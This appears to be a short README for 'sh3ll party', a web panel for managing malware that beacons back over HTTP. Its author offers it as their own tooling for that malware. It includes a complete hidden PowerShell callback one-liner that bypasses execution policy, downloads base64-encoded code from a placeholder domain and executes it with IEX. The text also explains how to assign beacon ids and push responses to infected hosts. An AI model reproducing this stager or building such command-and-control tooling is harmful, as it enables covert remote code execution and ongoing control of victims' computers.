sh3ll party
-----------
I had malware that called back at specified intervals via http but no frontend to manage it. This is what I came up with.

Callback script: `powershell -w hidden -ep bypass -nop -c "$i=(New-Object Net.WebClient);$i.Headers.add('hostid','1234567890');IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($i.DownloadString('http://your.domain.here'))))"`

You have to have a unique beacon id for each beacon. It can be anything. Make it the hostname, ip, mac, whatever.
Set response manually or upload a file. JQuery based datatables make it pretty. A bunch of shitty javascript makes it functional.
